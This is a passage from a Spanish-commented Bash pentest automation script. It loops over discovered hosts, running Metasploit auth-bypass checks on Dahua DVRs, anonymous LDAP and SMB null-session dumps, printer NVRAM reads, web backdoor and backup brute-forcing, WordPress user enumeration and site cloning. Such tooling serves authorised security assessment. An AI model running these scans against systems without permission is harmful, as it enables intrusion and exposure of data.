	
	#insert clean data	
	insert_data	
fi

#	dahua

if [ -f .servicios/dahua-dvr.txt ]
then
	echo -e "$OKBLUE #################### DAHUA (`wc -l .servicios/dahua-dvr.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		echo -e "[+] Escaneando $ip:$port"								
		echo -e "\t[+] Probando vulnerabilidad de Dahua"		
		msfconsole -x "use auxiliary/scanner/misc/dahua_dvr_auth_bypass;set RHOSTS $ip; set ACTION USER;run;exit" > logs/vulnerabilidades/$ip-37777-vulndahua.txt 2>/dev/null		
					
		egrep -iq "Dahua" logs/vulnerabilidades/$ip-37777-vulndahua.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Dahua vulnerable \n $RESET"
			cp logs/vulnerabilidades/$ip-37777-vulndahua.txt .vulnerabilidades/$ip-37777-vulndahua.txt
		else
			echo -e "\t$OKGREEN[i] Dahua no vulnerable $RESET"
		fi					
															
		 echo ""
 	done <.servicios/dahua-dvr.txt		
	
	#insert clean data	
	insert_data
	
fi


#	elasticsearch

if [ -f .servicios/elasticsearch.txt ]
then
	echo -e "$OKBLUE #################### Elastic search (`wc -l .servicios/elasticsearch.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando enumeracion de elasticsearch"		
		msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" > logs/vulnerabilidades/$ip-elasticsearch-vuln.txt 2>/dev/null
		grep --color=never "Indices found" logs/vulnerabilidades/$ip-elasticsearch-vuln.txt  > .vulnerabilidades/$ip-elasticsearch-vuln.txt 
																		
		 echo ""
 	done <.servicios/elasticsearch.txt
				
	#insert clean data	
	insert_data	
fi


if [ -f .servicios/juniper.txt ]
then
	echo -e "$OKBLUE #################### Juniper (`wc -l .servicios/juniper.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Enumerando juniper"		
		juniperXML.pl -url "http://$ip:$port" > logs/enumeracion/$ip-juniper-hostname.txt 2>/dev/null
		cp logs/enumeracion/$ip-juniper-hostname.txt .enumeracion/$ip-juniper-hostname.txt
																		
		 echo ""
 	done <.servicios/juniper.txt
				
	#insert clean data	
	insert_data	
fi


#INTEL
if [ -f .servicios/intel.txt ]
then
	echo -e "$OKBLUE #################### intel (`wc -l .servicios/intel.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando vulnerabilidad"				
		echo "nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/$ip-intel-bypass.txt 2>/dev/null
		nmap -n -p 16992 --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/$ip-intel-bypass.txt 2>/dev/null
		grep "|" logs/vulnerabilidades/$ip-intel-bypass.txt > .vulnerabilidades/$ip-intel-bypass.txt
													 
		 echo ""
 	done <.servicios/intel.txt	
	
	#insert clean data	
	insert_data
fi





#	servers
if [ -f .servicios/servers.txt ]
then
	echo -e "$OKBLUE #################### Servers (`wc -l .servicios/servers.txt`)######################$RESET"	    
	while ip line       
	do     			
		#ip=`echo $line | cut -f1 -d":"`		
		echo -e "[+] Escaneando $ip"
		echo -e "\t[+] Probando vulnerabilidad de sesión nula"
		###### Enum4linux ######
		echo "enum4linux $ip 2>/dev/null | grep -iv \"unknown\"" > logs/vulnerabilidades/$ip-$port-enum4linux.txt 
		enum4linux $ip 2>/dev/null | grep -iv "unknown" >> logs/vulnerabilidades/$ip-$port-enum4linux.txt 
		egrep -qi "allows sessions using username" logs/vulnerabilidades/$ip-$port-enum4linux.txt 
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then					     
		    echo -e "\t$OKRED[!] Sesión nula detectada \n $RESET"
			cp logs/vulnerabilidades/$ip-$port-enum4linux.txt  .vulnerabilidades/$ip-445-enum4linux.txt 
		else
			
			echo -e "\t$OKGREEN[i] No sesión nula $RESET"
		fi		
		#######################
															
		 echo ""
 	done <.servicios/servers.txt		
	#insert clean data	
	insert_data
	
fi



if [ -f .servicios/ldap.txt ]
then
	echo -e "$OKBLUE #################### LDAP (`wc -l .servicios/ldap.txt`) ######################$RESET"	    
	while read line          
	do        
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo dominio"	
		dominio=`nmap -n -p $port --script ldap-rootdse $ip | grep --color=never namingContexts | sed 's/|       namingContexts: //g' | head -1`
		echo $dominio > .enumeracion/$ip-$port-dominio.txt		
		###### LDAP ######
		if [ -z "$dominio" ]; then			
			echo -e "\t[i] No se pudo obtener el dominio "
		else
			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
			echo "ldapsearch -x -p $port -h $ip -b $dominio -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/$ip-$port-directorioLDAP.txt 
			ldapsearch -x -p $port -h $ip -b $dominio -s sub "(objectclass=*)" >> logs/vulnerabilidades/$ip-$port-directorioLDAP.txt 
					
			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/$ip-$port-directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
				cp logs/vulnerabilidades/$ip-$port-directorioLDAP.txt .vulnerabilidades/$ip-$port-directorioLDAP.txt 
			fi
		
		fi # fin sin dominio
				
		####################        
		
		 echo ""
 	done <.servicios/ldap.txt
		
	#insert clean data	
	insert_data
fi	


if [ -f .servicios/printers.txt ]
then
	echo -e "$OKBLUE #################### Printers (`wc -l .servicios/printers.txt`) ######################$RESET"	    		
	echo ls >> command.txt
	echo -e "\tnvram dump" >> command.txt	
	echo quit >> command.txt
	for line in $(cat .servicios/printers.txt); do
        ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Probando lectura de RAM"			
		
		echo "pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv \"\||Checking|ASCII|_|jan\" | tail -n +4" > logs/enumeracion/$ip-9100-PJL.txt 2>/dev/null 	
		pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv "\||Checking|ASCII|_|jan" | tail -n +4 >> logs/enumeracion/$ip-9100-PJL.txt 2>/dev/null 	
		cp logs/enumeracion/$ip-9100-PJL.txt .enumeracion/$ip-9100-PJL.txt 
			
    done;   
    rm command.txt   
    #insert clean data	
	insert_data
    
fi	



if [ -f .servicios/web.txt ]
then
      
    echo -e "$OKBLUE #################### WEB (`wc -l .servicios/web.txt`) ######################$RESET"	    
    ################ Obtener Informacion tipo de servidor, CMS, framework, etc ###########3
	for line in $(cat .servicios/web.txt); do  
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`					
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 											
				echo -e "[+] Escaneando $ip:$port"	
				echo -e "\t[+] Obteniendo informacion web"
				curl http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td><td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' > .enumeracion/$ip-$port-serverStatus.txt 
				webData.pl -t $ip -p $port -s 0 -e todo -d / -l logs/enumeracion/$ip-$port-webData.txt -r 4 > .enumeracion/$ip-$port-webData.txt 2>/dev/null  &								
				sleep 0.1;
			
				######## revisar por dominio #######
				if grep -q "," "$prefijo$FILE" 2>/dev/null; then			
					lista_subdominios=`grep $ip $prefijo$FILE | cut -d "," -f2`
					for subdominio in $lista_subdominios; do					
						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
						# no sigue redireccion (-r 0) para evitar que escaneemos 2 veces el mismo sitio
						webData.pl -t $subdominio -p $port -s 0 -e todo -d / -l logs/enumeracion/$subdominio-$port-webData.txt -r 0 > .enumeracion/$subdominio-$port-webData.txt 2>/dev/null 						
					done
				fi
				################################	
				break												
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de perl ($perl_instancias) "
				sleep 3									
			fi		
		done # while true		
	done # for
		
	 ######## wait to finish web info ########
	  while true; do
		perl_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	###########################################################


  # Web buster & clone
	for line in $(cat .servicios/web.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "[+] Escaneando $ip:$port"
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 
			
				#################  Realizar el escaneo por dominio  ##############
				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
					lista_subdominios=`grep $ip -a $prefijo$FILE | cut -d "," -f2`
					for subdominio in $lista_subdominios; do													
						echo -e "\t[+] subdominio: $subdominio"	
						
						egrep -qi "302 Found|500 Proxy Error" .enumeracion/$subdominio-$port-webData.txt
						greprc=$?	
						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy
																							  					
  							###  if the server is apache ######
							egrep -i "apache" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|BladeSystem|oracle|302 Found|Coyote|Express" # solo el segundo egrep poner "-q"
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
												
								echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Apache)"
								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m phpinfo -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-phpinfo.txt 2>/dev/null &
		
																
								echo -e "\t[+] Revisando vulnerabilidad slowloris ($subdominio)"
								echo "nmap --script http-slowloris-check -p $port $subdominio" > logs/vulnerabilidades/$subdominio-$port-slowloris.txt 2>/dev/null 
								nmap --script http-slowloris-check -p $port $subdominio >> logs/vulnerabilidades/$subdominio-$port-slowloris.txt 2>/dev/null
								grep "|" logs/vulnerabilidades/$ip-$port-slowloris.txt > .vulnerabilidades/$subdominio-$port-slowloris.txt  																		
							fi						
							####################################	
							
							#######  if the server is IIS ######
							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2										   
							fi
										
							####################################	
		
		
							#######  if the server is tomcat ######
							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" 
							greprc=$?				
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
								web-buster.pl -t $subdominio -p $port -h 5 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &										
								sleep 1										
							fi
										
							####################################
				
				
				
							
							#######  wordpress (domain) ######
							grep -qi wordpress .enumeracion/$subdominio-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 		
								wpscan  --update >/dev/null 						
								echo -e "\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
								wpscan --url http://$subdominio/ --enumerate u --follow-redirection > .enumeracion/$subdominio-$port-wpscan.txt &
							fi
							###################################	
							
							#######  joomla (domain) ######
							grep -qi joomla .enumeracion/$subdominio-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Revisando vulnerabilidades de joomla ($subdominio)"
								joomscan.sh -u http://$subdominio/ > .enumeracion/$subdominio-$port-joomscan.txt &
							fi
							###################################	
							
							#######  WAMPSERVER (domain) ######
							grep -qi WAMPSERVER .enumeracion/$subdominio-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Enumerando WAMPSERVER ($subdominio)"
								wampServer.pl -url http://$subdominio/ > .enumeracion/$subdominio-$port-WAMPSERVER.txt &
							fi
							###################################	
				
						
							#######  clone site (domain) ####### 									
							cd webClone
								echo -e "\t\t[+] Clonando sitio ($subdominio)"	
								wget -m -k -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp  -T 5 -t 1 -K -E  http://$subdominio
								rm index.html.orig 2>/dev/null
							cd ..										
							###################################							
						else
							echo -e "\t\t[+] Redirección o error de proxy detectado"	
						fi												
					done #subdominio
					
					#######  extract URLs ####### 
					cd webClone
						grep --color=never -irao "http://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
						lines=`wc -l http.txt  | cut -d " " -f1`
						perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
						paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt # adicionar http:// a cada linea
						rm http.txt
					
						grep --color=never -irao "https://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
						lines=`wc -l https.txt  | cut -d " " -f1`
						perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
						paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt  # adicionar https:// a cada linea
						rm https.txt
					cd ../
					###################################				    
					#done 					
				fi #rev por dominio
				################################
				
				
				#################  Realizar el escaneo por IP  ##############
				#######  wordpress (IP) ######
				grep -qi wordpress .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 		
					echo -e "\t\t[+] Revisando vulnerabilidades de wordpress (IP)"
					wpscan  --update >/dev/null
					wpscan --url http://$ip/ --enumerate u --follow-redirection > .enumeracion/$ip-$port-wpscan.txt &
				fi
				###########################
				
				#######  joomla (ip) ######
				grep -qi joomla .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 										
					echo -e "\t[+] Revisando vulnerabilidades de joomla (IP)"
					joomscan.sh -u http://$ip/ > .enumeracion/$ip-$port-joomscan.txt &
				fi
				###################################		

				#######  WAMPSERVER (ip) ######
				grep -qi WAMPSERVER .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 										
					echo -e "\t[+] Enumerando WAMPSERVER (IP)"
					wampServer.pl -url http://$ip/ > .enumeracion/$ip-$port-WAMPSERVER.txt &
				fi
				###################################					
				
					
					
				#######  if the server is IIS ######
				grep -i IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
				greprc=$?
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
				   #nmap -n -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
					nmap -n -p $port --script=http-iis-webdav-vuln $ip > logs/vulnerabilidades/$ip-$port-webdav.txt 2>/dev/null 
					grep "|" logs/vulnerabilidades/$ip-$port-webdav.txt | grep -v "WebDAV is DISABLED" > .vulnerabilidades/$ip-$port-webdav.txt 					
					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &	
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &	
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
					sleep 2										   
				fi
										
				####################################	
		
		
				#######  if the server is tomcat ######
				egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" 
				greprc=$?				
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
					echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
					web-buster.pl -t $ip -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &			
					web-buster.pl -t $ip -p $port -h 5 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &										
					sleep 1										
				fi
										
				####################################	
		
		
				#######  if the server is apache ######
				egrep -i "apache" .enumeracion/$ip-$port-webData.txt | egrep -qiv "cisco|BladeSystem|oracle|302 Found|Coyote|Express" # solo el segundo egrep poner "-q"
				greprc=$?
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
												
					#echo -e "\t[+] Revisando vulnerabilidad Struts"
					#echo "nmap -n -p $port $ip --script=http-vuln-cve2017-5638" > logs/vulnerabilidades/$ip-$port-Struts.txt 2>/dev/null 
					#nmap -n -p $port $ip --script=http-vuln-cve2017-5638 >> logs/vulnerabilidades/$ip-$port-Struts.txt 2>/dev/null 
					#grep "|" logs/vulnerabilidades/$ip-$port-Struts.txt > .vulnerabilidades/$ip-$port-Struts.txt  	
										
					#echo -e "\t[+] Revisando vulnerabilidad cgi"
					#echo "nmap -n -p $port $ip --script=http-vuln-cve2012-1823" > logs/vulnerabilidades/$ip-$port-cgi.txt 2>/dev/null 
					#nmap -n -p $port $ip --script=http-vuln-cve2012-1823 >> logs/vulnerabilidades/$ip-$port-cgi.txt 2>/dev/null 
					#grep "|" logs/vulnerabilidades/$ip-$port-cgi.txt > .vulnerabilidades/$ip-$port-cgi.txt  	
												
					echo -e "\t[+] Revisando directorios y archivos comunes (Apache)"
					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .servicios/cgi.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m archivosPeligrosos -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorApache -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 2 -d / -m phpinfo -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-phpinfo.txt 2>/dev/null &
																		
				fi						
				####################################						
										
				
				#######  DLINK backdoor ######
				grep -qi alphanetworks .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 		
				    echo -e "\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"
					cat .enumeracion/$ip-$port-webData.txt >vulnerabilidades/$ip-$port-dlinkBackdoor.txt 
				fi
				###########################
			break
		else
			perl_instancias=`ps aux | grep perl | wc -l`
			echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de perl ($perl_instancias) "
			sleep 3
		fi
		done # done true			
	done	# done for                       
	
	# revisar si hay scripts ejecutandose
	while true; do
	webbuster_instancias=`ps aux | egrep 'wampServer|web-buster|nmap|joomscan|wpscan' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data
	
fi # file exists



if [ -f .servicios/web-ssl.txt ]
then    
    
    echo -e "$OKBLUE #################### WEB - SSL (`wc -l .servicios/web-ssl.txt`) ######################$RESET"	    		

	# Extraer informacion web y SSL
	for line in $(cat .servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`						
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 
				echo -e "[+] Escaneando $ip:$port"
				echo -e "\t[+] Obteniendo información web"
				webData.pl -t $ip -p $port -s 1 -e todo -d / -l logs/enumeracion/$ip-$port-webData.txt -r 4 > .enumeracion/$ip-$port-webData.txt 2>/dev/null  &			
				echo -e "\t[+] Obteniendo información del certificado SSL"
				get_ssl_cert.py $ip $port  2>/dev/null | grep "("> .enumeracion/$ip-$port-cert.txt  &
				echo -e "\t"	
				sleep 0.1;	
				
				######## revisar por dominio #######
				if grep -q "," "$prefijo$FILE" 2>/dev/null; then			
					lista_subdominios=`grep $ip $prefijo$FILE | cut -d "," -f2`
					for subdominio in $lista_subdominios; do					
						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
						webData.pl -t $subdominio -p $port -s 1 -e todo -d / -l logs/enumeracion/$subdominio-$port-webData.txt -r 4 > .enumeracion/$subdominio-$port-webData.txt 2>/dev/null 
					done
				fi
				################################	
				
				break
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de perl ($perl_instancias) "
				sleep 3										
			fi		
	    done # while true
	 done # for

	 ######## wait to finish ########
	  while true; do
		perl_instancias=$((`ps aux | egrep "web-buster|get_ssl_cert" | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl/python activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	  ##############################


	for line in $(cat .servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "[+] Escaneando $ip:$port"
		
		while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
				perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
				if [[ $free_ram -gt $min_ram && $perl_instancias -lt 80  ]];then 				
				
				######## revisar por dominio #######
				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
					lista_subdominios=`grep $ip -a $prefijo$FILE | cut -d "," -f2`
					for subdominio in $lista_subdominios; do
						echo -e "\t[+] subdominio: $subdominio"	
						egrep -iq "302 Found|500 Proxy Error" .enumeracion/$subdominio-$port-webData.txt
						greprc=$?
						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy
																																	
							###  if the server is apache ######
							egrep -i "apache" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "cisco|BladeSystem|oracle|302 Found|Coyote|Express" # solo el segundo egrep poner "-q"
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
												
								echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Apache)"
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/$subdominio-$port-webarchivos.txt  &								
								sleep 2
								web-buster.pl -t $subdominio  -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/$subdominio-$port-webarchivos.txt
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-archivosPeligrosos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2
